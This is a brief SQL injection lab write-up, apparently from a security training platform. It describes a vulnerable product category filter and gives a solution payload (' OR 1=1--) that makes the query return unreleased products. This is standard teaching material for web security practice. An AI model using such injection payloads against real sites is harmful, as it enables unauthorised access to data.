# Description
This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.
# Solution

```
GET /filter?category=' OR 1=1--
```

=> **SQL query:** `SELECT * FROM products WHERE category = '' OR 1=1--
